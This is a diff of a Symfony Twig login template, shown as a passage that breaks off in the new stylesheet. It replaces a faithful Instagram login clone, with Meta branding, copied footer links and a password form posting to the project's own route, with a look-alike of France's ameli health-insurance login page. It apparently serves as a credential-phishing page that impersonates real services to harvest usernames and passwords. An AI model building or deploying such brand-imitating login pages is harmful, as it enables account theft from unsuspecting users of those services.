@@ -1,700 +1,714 @@
 {% extends 'base.html.twig' %}
 
-{% block title %}Instagram
-{% endblock %}
+{% block title %}Compte ameli - Connexion{% endblock %}
 
 {% block stylesheets %}
-	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
-	<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-	<style>
-	/* =====================================================
-       VARIABLES INSTAGRAM OFFICIELLES (dark mode)
-    ====================================================== */:root
-	{
-		--ig-primary-background: 0, 0, 0;
-		--ig-right-bg: #101923;
-		--ig-input-bg: transparent;
-		--ig-primary-text: 245, 245, 245;
-		--ig-secondary-text: 168, 168, 168;
-		--ig-tertiary-text: 115, 115, 115;
-		--ig-separator: 54, 54, 54;
-		--ig-stroke: 54, 54, 54;
-		--ig-focus-stroke: 85, 85, 85;
-		--ig-primary-button: 0, 149, 246;
-		--ig-primary-button-hover: 24, 119, 242;
-		--ig-input-border-radius: 16px;
-		--ig-input-border: 62, 68, 81;
-		--ig-link: 224, 241, 255;
-		--ig-facebook-blue: 24, 119, 242;
-		--ig-blue: 0, 149, 246;
-		--ig-blue-hover: 24, 119, 242;
-	}
-
-	* {
-		margin: 0;
-		padding: 0;
-		box-sizing: border-box;
-	}
-
-	html,
-	body {
-		height: 100%;
-		font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-		background: #000;
-		color: rgb(var(--ig-primary-text));
-		font-size: 14px;
-		line-height: 1.5;
-	}
-
-	/* =====================================================
-       STRUCTURE PRINCIPALE
-    ====================================================== */
-	.ig-page {
-		display: flex;
-		flex-direction: column;
-		min-height: 100vh;
-	}
-
-	.ig-main {
-		display: flex;
-		flex: 1;
-	}
-
-	/* =====================================================
-       PANNEAU GAUCHE
-    ====================================================== */
-	.ig-left {
-		background: #000000;
-		width: 50%;
-		display: flex;
-		flex-direction: column;
-		align-items: center;
-		justify-content: center;
-		padding: 24px 40px 20px 56px;
-		overflow: hidden;
-		min-height: 0;
-	}
-
-	/* Logo Instagram (image) */
-	.ig-logo-wrap {
-		position: relative;
-		z-index: 1;
-		margin-bottom: 0px;
-		margin-top: -50px;
-		align-self: flex-start;
-		margin-left: -10px;
-	}
-
-	.ig-logo-img {
-		width: 78px;
-		height: 78px;
-		object-fit: contain;
-	}
-
-	/* Titre gauche */
-	.ig-left-title {
-		font-size: 2rem;
-		font-weight: 600;
-		font-style: normal;
-		color: rgb(var(--ig-primary-text));
-		text-align: center;
-		line-height: 2.05;
-		max-width: 500px;
-		margin-top: -15px;
-		margin-bottom: 16px;
-		letter-spacing: -0.3px;
-		align-self: center;
-	}
-
-	/* Dégradé orange → rose sur "ami(e)s" */
-	.ig-left-title .text-pink {
-		background: linear-gradient(90deg, #f7a034, #e1306c, #c13584);
-		-webkit-background-clip: text;
-		-webkit-text-fill-color: transparent;
-		background-clip: text;
-	}
-	/* Dégradé jaune → orange sur "proches" */
-	.ig-left-title .text-purple {
-		background: linear-gradient(90deg, #fccc63, #f7a034, #e1306c);
-		-webkit-background-clip: text;
-		-webkit-text-fill-color: transparent;
-		background-clip: text;
-	}
-
-	/* Image carousel container */
-	.ig-carousel {
-		width: 220px;
-		max-width: 60%;
-		flex-shrink: 1;
-		align-self: center;
-		position: relative;
-		z-index: 1;
-		cursor: pointer;
-		aspect-ratio: 4 / 5;
-		overflow: hidden;
-		border-radius: 12px;
-	}
-
-	.ig-carousel-img {
-		position: absolute;
-		top: 0;
-		left: 0;
-		width: 100%;
-		height: 100%;
-		object-fit: cover;
-		object-position: top center;
-		opacity: 0;
-		transition: opacity 0.6s cubic-bezier(0.4, 0, 0.2, 1), transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
-		filter: drop-shadow(0 16px 40px rgba(0,0,0,0.45));
-		transform: scale(1.03);
-		user-select: none;
-		-webkit-user-drag: none;
-	}
-
-	.ig-carousel-img.active {
-		opacity: 1;
-		transform: scale(1);
-		z-index: 2;
-	}
-
-
-
-	/* =====================================================
-       PANNEAU DROIT
-    ====================================================== */
-	.ig-right {
-		width: 50%;
-		background: var(--ig-right-bg);
-		display: flex;
-		flex-direction: column;
-		align-items: center;
-		justify-content: flex-start;
-		padding: 60px 24px 40px;
-		border-left: 2px solid rgb(var(--ig-input-border));
-	}
-
-	.ig-form-box {
-		width: 100%;
-		max-width: 522px; /* 13.8cm */
-	}
-
-	/* Titre formulaire */
-	.ig-form-title {
-		font-size: 1.3rem;
-		font-weight: 500;
-		color: rgb(var(--ig-primary-text));
-		margin-bottom: 20px;
-		letter-spacing: 0;
-	}
-
-	/* =====================================================
-       CHAMPS DE SAISIE — Floating Label Instagram
-       Le label flotte vers le haut au focus / quand rempli
-    ====================================================== */
-	.ig-input-wrap {
-		position: relative;
-		margin-bottom: 19px;
-	}
-
-	.ig-input {
-		width: 100%;
-		background: transparent;
-		border: 1.5px solid rgb(var(--ig-input-border));
-		border-radius: var(--ig-input-border-radius);
-		color: rgb(var(--ig-primary-text));
-		font-size: 1.05rem;
-		font-weight: 400;
-		height: 57px;
-		padding: 14px 18px 8px;
-		outline: none;
-		transition: border-color 0.25s ease, background 0.25s ease, box-shadow 0.25s ease;
-		font-family: inherit;
-	}
-
-	/* On cache le placeholder natif (on utilise le label à la place) */
-	.ig-input::placeholder {
-		color: transparent;
-	}
-
-	/* Label flottant */
-	.ig-floating-label {
-		position: absolute;
-		left: 18px;
-		top: 50%;
-		transform: translateY(-50%);
-		color: rgb(var(--ig-secondary-text));
-		font-size: 1.05rem;
-		font-weight: 400;
-		pointer-events: none;
-		transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
-		transform-origin: left center;
-		line-height: 1;
-	}
-
-	/* État flottant : focus OU champ rempli */
-	.ig-input:focus + .ig-floating-label,
-	.ig-input:not(:placeholder-shown) + .ig-floating-label {
-		top: 10px;
-		transform: translateY(0) scale(0.7);
-		color: rgb(var(--ig-secondary-text));
-	}
-
-	/* Bordure colorée au focus */
-	.ig-input:focus {
-		border-color: rgb(var(--ig-blue));
-		background: transparent;
-		box-shadow: 0 0 0 1px rgb(var(--ig-blue));
-	}
-
-	/* =====================================================
-       BOUTON "SE CONNECTER" — bleu Instagram #0095F6
-    ====================================================== */
-	.ig-btn-primary {
-		width: 100%;
-		background: rgb(var(--ig-blue));
-		border: none;
-		border-radius: 50px;
-		color: #ffffff;
-		font-size: 1.08rem;
-		font-weight: 400;
-		padding: 10px 20px;
-		margin-top: 10px;
-		cursor: pointer;
-		transition: background 0.2s ease, transform 0.1s ease, opacity 0.2s;
-		font-family: inherit;
-		letter-spacing: 0.2px;
-	}
-
-	.ig-btn-primary:hover {
-		background: rgb(var(--ig-blue-hover));
-		opacity: 0.95;
-	}
-
-	.ig-btn-primary:active {
-		transform: scale(0.99);
-	}
-
-	.ig-btn-primary:disabled {
-		background: rgba(var(--ig-blue), 0.25);
-		border: none;
-		color: rgba(var(--ig-primary-text), 0.35);
-		cursor: default;
-	}
-
-	/* =====================================================
-       LIEN MOT DE PASSE OUBLIÉ
-    ====================================================== */
-	.ig-link-forgot {
-		display: block;
-		text-align: center;
-		color: rgb(var(--ig-primary-text));
-		font-size: 1.08rem;
-		font-weight: 400;
-		text-decoration: none;
-		margin: 22px 0 40px;
-		padding: 10px 20px;
-		border: 1px solid transparent;
-		border-radius: 50px;
-		transition: background 0.2s, border-color 0.2s, color 0.2s;
-	}
-
-	.ig-link-forgot:hover {
-		background: rgba(255, 255, 255, 0.06);
-		border-color: rgb(var(--ig-focus-stroke));
-		color: #fff;
-	}
-
-	/* =====================================================
-       BOUTON FACEBOOK
-    ====================================================== */
-	.ig-btn-facebook {
-		display: flex;
-		align-items: center;
-		justify-content: center;
-		gap: 10px;
-		width: 100%;
-		background: transparent;
-		border: 1px solid rgb(var(--ig-separator));
-		border-radius: 50px;
-		color: rgb(var(--ig-primary-text));
-		font-size: 1.08rem;
-		font-weight: 400;
-		padding: 10px 20px;
-		text-decoration: none;
-		transition: background 0.2s, border-color 0.2s, color 0.2s;
-		cursor: pointer;
-		font-family: inherit;
-		margin-bottom: 10px;
-	}
-
-	.ig-btn-facebook:hover {
-		background: rgba(255, 255, 255, 0.06);
-		border-color: rgb(var(--ig-focus-stroke));
-		color: #fff;
-	}
-
-	.ig-btn-facebook .fb-svg {
-		width: 20px;
-		height: 20px;
-		fill: rgb(var(--ig-facebook-blue));
-		flex-shrink: 0;
-	}
-
-	/* =====================================================
-       BOUTON "CRÉER UN NOUVEAU COMPTE"
-       Border bleu, texte bleu
-    ====================================================== */
-	.ig-btn-register {
-		display: block;
-		text-align: center;
-		width: 100%;
-		background: transparent;
-		border: 1px solid rgb(var(--ig-blue));
-		border-radius: 50px;
-		color: rgb(var(--ig-blue));
-		font-size: 1.08rem;
-		font-weight: 500;
-		padding: 10px 20px;
-		text-decoration: none;
-		transition: background 0.2s, color 0.2s;
-		font-family: inherit;
-		letter-spacing: 0.2px;
-	}
-
-	.ig-btn-register:hover {
-		background: rgba(0, 149, 246, 0.1);
-		color: rgb(var(--ig-blue-hover));
-	}
-
-	/* =====================================================
-       META LOGO
-    ====================================================== */
-	.ig-meta {
-		display: flex;
-		align-items: center;
-		justify-content: center;
-		gap: 0px;
-		color: rgb(var(--ig-primary-text));
-		font-size: 1.15rem;
-		font-weight: 400;
-		margin: 14px 0 8px;
-	}
-
-	.ig-meta svg {
-		width: 30px;
-		height: 17px;
-		fill: rgb(var(--ig-primary-text));
-	}
-
-	/* =====================================================
-       TEXTE SIGNALEMENT
-    ====================================================== */
-	.ig-report-text {
-		text-align: center;
-		color: rgb(var(--ig-tertiary-text));
-		font-size: 0.9rem;
-		line-height: 1.55;
-		padding: 0 10px;
-	}
-
-	.ig-report-text a {
-		color: rgb(var(--ig-blue));
-		text-decoration: none;
-		font-weight: 500;
-	}
-
-	.ig-report-text a:hover {
-		text-decoration: underline;
-	}
-
-	/* =====================================================
-       ALERTE D'ERREUR
-    ====================================================== */
-	.ig-alert {
-		background: rgba(237, 73, 86, 0.12);
-		border: 1px solid rgba(237, 73, 86, 0.3);
-		border-radius: 10px;
-		color: rgb(254, 97, 114);
-		padding: 12px 16px;
-		font-size: 1rem;
-		margin-bottom: 14px;
-		line-height: 1.4;
-	}
-
-	/* =====================================================
-       FOOTER — copié fidèlement d'Instagram
-    ====================================================== */
-	.ig-footer {
-		background: #000;
-		border-top: 2px solid rgb(var(--ig-input-border));
-		padding: 18px 32px 20px;
-	}
-
-	.ig-footer-links {
-		display: flex;
-		flex-wrap: wrap;
-		justify-content: center;
-		gap: 5px 12px;
-		margin-bottom: 10px;
-	}
-
-	.ig-footer-links a {
-		color: rgba(220, 225, 235, 0.75); /* liens plus blancs/clairs */
-		text-decoration: none;
-		font-size: 0.85rem;
-		transition: text-decoration 0.1s;
-	}
-
-	.ig-footer-links a:hover {
-		color: rgba(220, 225, 235, 0.75); /* couleur inchangée au survol */
-		text-decoration: underline; /* seulement le soulignement */
-	}
-
-	.ig-footer-bottom {
-		display: flex;
-		align-items: center;
-		justify-content: center;
-		flex-wrap: wrap;
-		gap: 14px;
-	}
-
-	.ig-footer-lang {
-		color: rgba(220, 225, 235, 0.75);
-		font-size: 0.85rem;
-		display: flex;
-		align-items: center;
-		gap: 4px;
-		cursor: pointer;
-		background: none;
-		border: none;
-		font-family: inherit;
-		padding: 0;
-	}
-
-	.ig-footer-copyright {
-		color: rgba(220, 225, 235, 0.75);
-		font-size: 0.85rem;
-	}
-
-	/* Logo mobile (caché en desktop) */
-	.ig-mobile-header {
-		display: none;
-	}
-
-	/* =====================================================
-       RESPONSIVE MOBILE
-    ====================================================== */
-	@media(max-width: 768px) {
-		.ig-mobile-header {
-			display: flex;
-			justify-content: center;
-			width: 100%;
-			padding: 24px 0;
-			background: #000;
-			border-bottom: 2px solid rgb(var(--ig-input-border));
-		}
-		.ig-mobile-header img {
-			width: 64px;
-			height: 64px;
-			object-fit: contain;
-		}
-		.ig-left {
-			display: none !important;
-		}
-		.ig-right {
-			width: 100%;
-			background: var(--ig-right-bg);
-			border-left: none;
-		}
-		.ig-form-box {
-			max-width: 380px;
-		}
-		.ig-footer {
-			border-top: none;
-		}
-	}
-</style>{% endblock %}{% block body %}
-<div
-	class="ig-page">
-
-	<!-- Logo mobile pleine largeur -->
-	<div class="ig-mobile-header">
-		<img src="{{ asset('images/instagram_logo.png') }}" alt="Instagram">
-	</div>
-
-	<!-- ═══════════════ CONTENU PRINCIPAL ═══════════════ -->
-	<div
-		class="ig-main">
-
-		<!-- ──────── PANNEAU GAUCHE ──────── -->
-		<div
-			class="ig-left d-none d-md-flex flex-column">
-
-			<!-- Logo Instagram -->
-			<div class="ig-logo-wrap">
-				<img src="{{ asset('images/instagram_logo.png') }}" alt="Instagram" class="ig-logo-img">
-			</div>
-
-			<!-- Titre -->
-			<h1 class="ig-left-title">
-				Découvrez des moments du quotidien de vos
-				<span class="text-pink">ami(e)s</span>
-				<br><span class="text-purple">proches.</span>
-			</h1>
-
-			<!-- Carrousel d'images -->
-			<div class="ig-carousel" id="igCarousel" title="Cliquez pour changer l'image">
-				<img src="{{ asset('images/image1.png') }}" alt="Instagram 1" class="ig-carousel-img active">
-				<img src="{{ asset('images/image2.png') }}" alt="Instagram 2" class="ig-carousel-img">
-				<img src="{{ asset('images/instagram_hero.png') }}" alt="Instagram Hero" class="ig-carousel-img">
-			</div>
-
-		</div>
-
-		<!-- ──────── PANNEAU DROIT ──────── -->
-		<div class="ig-right">
-			<div class="ig-form-box">
-
-				<h2 class="ig-form-title">Se connecter à Instagram</h2>
-
-				{# Erreur Symfony #}
-				{% if error is defined and error %}
-					<div class="ig-alert">{{ error }}</div>
-				{% endif %}
-
-				{# Formulaire Symfony Security #}
-				<form method="POST" action="{{ path('app_login') }}" novalidate>
-					<input type="hidden" name="_csrf_token" value="{{ csrf_token('authenticate') }}">
-
-					<div class="ig-input-wrap">
-						<input type="text" name="_username" id="inputIdentifier" class="ig-input" placeholder=" " value="{{ last_username ?? '' }}" autocomplete="username" required>
-						<label for="inputIdentifier" class="ig-floating-label">Numéro de mobile, nom de profil ou adresse e-mail</label>
-					</div>
-
-					<div class="ig-input-wrap" style="margin-bottom: 16px;">
-						<input type="password" name="_password" id="inputPassword" class="ig-input" placeholder=" " autocomplete="current-password" required>
-						<label for="inputPassword" class="ig-floating-label">Mot de passe</label>
-					</div>
-
-					<button type="submit" class="ig-btn-primary" id="btnLogin" disabled>
-						Se connecter
-					</button>
-				</form>
-
-				<!-- Mot de passe oublié -->
-				<a href="{{ path('app_password_reset') }}" class="ig-link-forgot">
-					Mot de passe oublié ?
-				</a>
-
-				<!-- Bouton Facebook -->
-				<a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATpJ6wkx9xX-eJts-hYtgP0ACrYNSr7_VKVAxoFv3X-c0wD5ul8KQwXOMhHMEPFw7oIutNlELt-PSt9HOLXoj3jUttIZs5nxuefXb4oBVaLgX9Iot-ggKpXmZ24oEoFIpvozW75r4dcPJMe47xNNnzCfcOqb6zbWWkJ-2I-9Q4ZtaOmc7im5_qACwZuNfhi5nX5k0DDnFsta0MFFLRO3Z-FOUgdMkEIF8wBokF2-RqJTU8nT3lsknuGShZp3zB175VILibyygWMm9zoeWh95xrIl2Q" target="_blank" rel="noopener" class="ig-btn-facebook">
-					<svg class="fb-svg" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-						<path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
-					</svg>
-					Se connecter avec Facebook
-				</a>
-
-				<!-- Créer un compte -->
-				<a href="{{ path('app_register') }}" class="ig-btn-register">
-					Créer un nouveau compte
-				</a>
-
-				<!-- Logo Meta -->
-				<div class="ig-meta">
-					<svg xmlns="http://www.w3.org/2000/svg" width="22" height="12" fill="currentColor" viewBox="0 0 16 16">
-						<path fill-rule="evenodd" d="M8.217 5.243C9.145 3.988 10.171 3 11.483 3 13.96 3 16 6.153 16.001 9.907c0 2.29-.986 3.725-2.757 3.725-1.543 0-2.395-.866-3.924-3.424l-.667-1.123-.118-.197a55 55 0 0 0-.53-.877l-1.178 2.08c-1.673 2.925-2.615 3.541-3.923 3.541C1.086 13.632 0 12.217 0 9.973 0 6.388 1.995 3 4.598 3q.477-.001.924.122c.31.086.611.22.913.407.577.359 1.154.915 1.782 1.714m1.516 2.224q-.378-.615-.727-1.133L9 6.326c.845-1.305 1.543-1.954 2.372-1.954 1.723 0 3.102 2.537 3.102 5.653 0 1.188-.39 1.877-1.195 1.877-.773 0-1.142-.51-2.61-2.87zM4.846 4.756c.725.1 1.385.634 2.34 2.001A212 212 0 0 0 5.551 9.3c-1.357 2.126-1.826 2.603-2.581 2.603-.777 0-1.24-.682-1.24-1.9 0-2.602 1.298-5.264 2.846-5.264q.137 0 .27.018"/>
-					</svg>
-					Meta
-				</div>
-
-				<!-- Texte signalement -->
-				<p class="ig-report-text">
-					Vous pouvez également
-					<a href="https://help.instagram.com/contact/406206379945942/?locale=fr_FR" target="_blank" rel="noopener">signaler le contenu que vous pensez illégal</a>
-					dans votre pays sans vous connecter.
-				</p>
-
-			</div>
-			{# fin ig-form-box #}
-		</div>
-		{# fin ig-right #}
-
-	</div>
-	{# fin ig-main #}
-
-	<!-- ═══════════════ FOOTER ═══════════════ -->
-	<footer class="ig-footer">
-
-		<div class="ig-footer-links">
-			<a href="https://www.meta.com/fr-fr/about/?utm_source=about.meta.com&utm_medium=redirect" target="_blank" rel="noopener">Meta</a>
-			<a href="https://about.instagram.com/fr-fr" target="_blank" rel="noopener">À propos</a>
-			<a href="https://about.instagram.com/blog/" target="_blank" rel="noopener">Blog</a>
-			<a href="https://about.instagram.com/about-us/careers" target="_blank" rel="noopener">Emplois</a>
-			<a href="https://help.instagram.com/" target="_blank" rel="noopener">Aide</a>
-			<a href="https://developers.facebook.com/docs/instagram-platform" target="_blank" rel="noopener">API</a>
-			<a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect" target="_blank" rel="noopener">Confidentialité</a>
-			<a href="#">Paramètres des cookies</a>
-			<a href="#">Conditions</a>
-			<a href="#">Lieux</a>
-			<a href="#">Instagram Lite</a>
-			<a href="#">Meta AI</a>
-			<a href="#">Threads</a>
-			<a href="#">Importation des contacts et non-utilisateurs</a>
-			<a href="#">Meta Verified</a>
-		</div>
-
-		<div class="ig-footer-links">
-			<a href="#">Résilier des contrats ici</a>
-		</div>
-
-		<div class="ig-footer-bottom">
-			<button class="ig-footer-lang">
-				Français
-				<svg width="10" height="8" viewbox="0 0 10 8" fill="none">
-					<path d="M1 1.5L5 5.5L9 1.5" stroke="rgb(115,115,115)" stroke-width="1.5" stroke-linecap="round"/>
-				</svg>
-			</button>
-			<span class="ig-footer-copyright">© 2026 Instagram par Meta</span>
-		</div>
-
-	</footer>
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons+Outlined" rel="stylesheet">
+<style>
+/* =====================================================
+   VARIABLES AMELI (thème officiel clair)
+====================================================== */
+:root {
+    --ameli-blue: #1746A2;
+    --ameli-blue-dark: #0F3280;
+    --ameli-blue-light: #4A7BD5;
+    --ameli-green: #00853E;
+    --ameli-bg: #FFFFFF;
+    --ameli-bg-gray: #F5F5F5;
+    --ameli-text: #333333;
+    --ameli-text-light: #666666;
+    --ameli-text-muted: #999999;
+    --ameli-border: #CCCCCC;
+    --ameli-border-light: #E0E0E0;
+    --ameli-link: #1746A2;
+    --ameli-footer-bg: #1E2B3A;
+    --ameli-footer-text: #FFFFFF;
+    --ameli-input-focus: #1746A2;
+    --ameli-btn-blue: #1746A2;
+    --ameli-btn-blue-hover: #0F3280;
+    --ameli-separator: #CCCCCC;
+}
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+html, body {
+    height: 100%;
+    font-family: 'Open Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background: var(--ameli-bg);
+    color: var(--ameli-text);
+    font-size: 14px;
+    line-height: 1.5;
+}
+
+/* =====================================================
+   STRUCTURE PRINCIPALE
+====================================================== */
+.ameli-page {
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+}
+
+/* =====================================================
+   NAVBAR HEADER
+====================================================== */
+.ameli-navbar {
+    background: var(--ameli-bg);
+    border-bottom: 3px solid var(--ameli-blue);
+    padding: 12px 40px;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    box-shadow: 0 1px 4px rgba(0,0,0,0.06);
+}
+
+.ameli-navbar-logo {
+    display: flex;
+    align-items: center;
+    gap: 0;
+    text-decoration: none;
+}
+
+.ameli-navbar-logo img {
+    height: 52px;
+    width: auto;
+    object-fit: contain;
+}
+
+.ameli-navbar-divider {
+    width: 1px;
+    height: 36px;
+    background: var(--ameli-border);
+    margin: 0 12px;
+}
+
+.ameli-navbar-title {
+    font-size: 1.15rem;
+    font-weight: 600;
+    color: var(--ameli-blue);
+    letter-spacing: 0.2px;
+}
+
+.ameli-navbar-title span {
+    color: var(--ameli-green);
+}
+
+/* =====================================================
+   CONTENU PRINCIPAL (FORMULAIRE DE LOGIN)
+====================================================== */
+.ameli-main {
+    flex: 1;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    padding: 50px 24px 60px;
+    background: var(--ameli-bg);
+}
+
+.ameli-login-card {
+    width: 100%;
+    max-width: 580px;
+    background: var(--ameli-bg);
+    padding: 0;
+}
+
+/* Titre principal */
+.ameli-login-title {
+    font-size: 1.75rem;
+    font-weight: 400;
+    color: var(--ameli-text);
+    text-align: center;
+    margin-bottom: 32px;
+    letter-spacing: -0.2px;
+}
+
+/* Note champs obligatoires */
+.ameli-required-note {
+    font-size: 0.85rem;
+    font-weight: 600;
+    font-style: italic;
+    color: var(--ameli-text);
+    margin-bottom: 24px;
+}
+
+/* =====================================================
+   CHAMPS DE SAISIE — Style Ameli avec icône et underline
+====================================================== */
+.ameli-field-group {
+    margin-bottom: 8px;
+}
+
+.ameli-input-row {
+    display: flex;
+    align-items: center;
+    border-bottom: 1.5px solid var(--ameli-border);
+    padding: 12px 0;
+    transition: border-color 0.25s ease;
+    gap: 12px;
+}
+
+.ameli-input-row:focus-within {
+    border-color: var(--ameli-blue);
+}
+
+.ameli-input-icon {
+    color: var(--ameli-text-muted);
+    font-size: 1.3rem;
+    flex-shrink: 0;
+    width: 24px;
+    text-align: center;
+}
+
+.ameli-input {
+    flex: 1;
+    background: transparent;
+    border: none;
+    color: var(--ameli-text);
+    font-size: 1rem;
+    font-weight: 400;
+    padding: 4px 0;
+    outline: none;
+    font-family: inherit;
+}
+
+.ameli-input::placeholder {
+    color: var(--ameli-text-muted);
+    font-weight: 400;
+}
+
+.ameli-input:focus::placeholder {
+    color: var(--ameli-border);
+}
+
+/* Toggle visibilité mot de passe */
+.ameli-toggle-password {
+    background: none;
+    border: none;
+    color: var(--ameli-text-muted);
+    cursor: pointer;
+    padding: 4px;
+    font-size: 1.2rem;
+    display: flex;
+    align-items: center;
+    transition: color 0.2s;
+}
+
+.ameli-toggle-password:hover {
+    color: var(--ameli-text);
+}
+
+/* Lien sous champ */
+.ameli-field-link {
+    display: inline-block;
+    color: var(--ameli-link);
+    font-size: 0.85rem;
+    font-weight: 400;
+    text-decoration: none;
+    margin-top: 8px;
+    transition: text-decoration 0.2s;
+}
+
+.ameli-field-link:hover {
+    text-decoration: underline;
+}
+
+/* =====================================================
+   BOUTON "ME CONNECTER"
+====================================================== */
+.ameli-btn-connect {
+    display: block;
+    width: auto;
+    min-width: 260px;
+    margin: 32px auto 0;
+    background: var(--ameli-btn-blue);
+    border: none;
+    border-radius: 4px;
+    color: #ffffff;
+    font-size: 0.9rem;
+    font-weight: 600;
+    padding: 14px 40px;
+    cursor: pointer;
+    text-transform: uppercase;
+    letter-spacing: 1.5px;
+    transition: background 0.2s ease, box-shadow 0.2s ease, transform 0.1s ease;
+    font-family: inherit;
+}
+
+.ameli-btn-connect:hover {
+    background: var(--ameli-btn-blue-hover);
+    box-shadow: 0 2px 8px rgba(23,70,162,0.3);
+}
+
+.ameli-btn-connect:active {
+    transform: scale(0.98);
+}
+
+.ameli-btn-connect:disabled {
+    background: #95A5C8;
+    cursor: default;
+    box-shadow: none;
+}
+
+/* =====================================================
+   SÉPARATEUR "OU"
+====================================================== */
+.ameli-separator {
+    display: flex;
+    align-items: center;
+    margin: 36px 0;
+    gap: 16px;
+}
+
+.ameli-separator-line {
+    flex: 1;
+    height: 1px;
+    background: var(--ameli-separator);
+}
+
+.ameli-separator-text {
+    font-size: 1.3rem;
+    font-weight: 400;
+    color: var(--ameli-text);
+    padding: 0 8px;
+    text-transform: uppercase;
+}
+
+/* =====================================================
+   SECTION FRANCECONNECT
+====================================================== */
+.ameli-fc-section {
+    text-align: center;
+}
+
+.ameli-fc-description {
+    font-size: 0.9rem;
+    color: var(--ameli-text);
+    line-height: 1.6;
+    margin-bottom: 20px;
+}
+
+.ameli-fc-description strong {
+    font-weight: 700;
+    color: var(--ameli-blue);
+}
+
+.ameli-fc-btn {
+    display: inline-block;
+    margin-bottom: 12px;
+    transition: transform 0.2s, box-shadow 0.2s;
+    border-radius: 4px;
+    overflow: hidden;
+}
+
+.ameli-fc-btn:hover {
+    transform: translateY(-1px);
+    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+}
+
+.ameli-fc-btn img {
+    height: 52px;
+    width: auto;
+    display: block;
+}
+
+.ameli-fc-link {
+    display: block;
+    color: var(--ameli-link);
+    font-size: 0.85rem;
+    text-decoration: none;
+    margin-top: 4px;
+    transition: text-decoration 0.2s;
+}
+
+.ameli-fc-link:hover {
+    text-decoration: underline;
+}
+
+/* =====================================================
+   SECTION "CRÉER UN COMPTE"
+====================================================== */
+.ameli-create-account {
+    text-align: center;
+    margin-top: 40px;
+    padding-top: 0;
+    font-size: 0.95rem;
+    color: var(--ameli-text);
+}
+
+.ameli-create-account a {
+    color: var(--ameli-link);
+    font-weight: 600;
+    text-decoration: none;
+    transition: text-decoration 0.2s;
+}
+
+.ameli-create-account a:hover {
+    text-decoration: underline;
+}
+
+/* =====================================================
+   ALERTE D'ERREUR
+====================================================== */
+.ameli-alert {
+    background: #FFF3F3;
+    border: 1px solid #E74C3C;
+    border-left: 4px solid #E74C3C;
+    border-radius: 4px;
+    color: #C0392B;
+    padding: 12px 16px;
+    font-size: 0.9rem;
+    margin-bottom: 20px;
+    line-height: 1.4;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+}
+
+.ameli-alert .material-icons-outlined {
+    font-size: 1.2rem;
+    color: #E74C3C;
+}
+
+/* =====================================================
+   FOOTER AMELI
+====================================================== */
+.ameli-footer {
+    background: var(--ameli-footer-bg);
+    padding: 20px 40px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 16px;
+}
+
+.ameli-footer-logo {
+    display: flex;
+    align-items: center;
+    flex-shrink: 0;
+}
+
+.ameli-footer-logo img {
+    height: 44px;
+    width: auto;
+    filter: brightness(0) invert(1);
+    opacity: 0.9;
+}
+
+.ameli-footer-links {
+    display: flex;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 0;
+    flex: 1;
+    justify-content: center;
+}
+
+.ameli-footer-links a {
+    color: var(--ameli-footer-text);
+    text-decoration: none;
+    font-size: 0.78rem;
+    font-weight: 400;
+    padding: 6px 16px;
+    transition: text-decoration 0.1s, opacity 0.2s;
+    opacity: 0.9;
+    white-space: nowrap;
+    border-right: 1px solid rgba(255,255,255,0.25);
+}
+
+.ameli-footer-links a:last-child {
+    border-right: none;
+}
+
+.ameli-footer-links a:hover {
+    text-decoration: underline;
+    opacity: 1;
+}
+
+.ameli-footer-site {
+    color: var(--ameli-footer-text);
+    font-size: 0.78rem;
+    font-weight: 600;
+    text-decoration: none;
+    opacity: 0.9;
+    flex-shrink: 0;
+    transition: opacity 0.2s;
+}
+
+.ameli-footer-site:hover {
+    opacity: 1;
+    text-decoration: underline;
+}
+
+/* =====================================================
+   RESPONSIVE MOBILE
+====================================================== */
+@media (max-width: 768px) {
+    .ameli-navbar {
+        padding: 10px 16px;
+    }
+
+    .ameli-navbar-logo img {
+        height: 40px;
+    }
+
+    .ameli-navbar-title {
+        font-size: 0.95rem;
+    }
+
+    .ameli-main {
+        padding: 30px 16px 40px;
+    }
+
+    .ameli-login-title {
+        font-size: 1.35rem;
+    }
+
+    .ameli-btn-connect {
+        width: 100%;
+        min-width: unset;
+    }
+
+    .ameli-footer {
+        flex-direction: column;
+        align-items: center;
+        text-align: center;
+        padding: 20px 16px;
+        gap: 12px;
+    }
+
+    .ameli-footer-links {
+        justify-content: center;
+    }
+
+    .ameli-footer-links a {
+        padding: 4px 10px;
+        font-size: 0.72rem;
+    }
+}
+
+@media (max-width: 480px) {
+    .ameli-navbar-divider,
+    .ameli-navbar-title {
+        display: none;
+    }
+
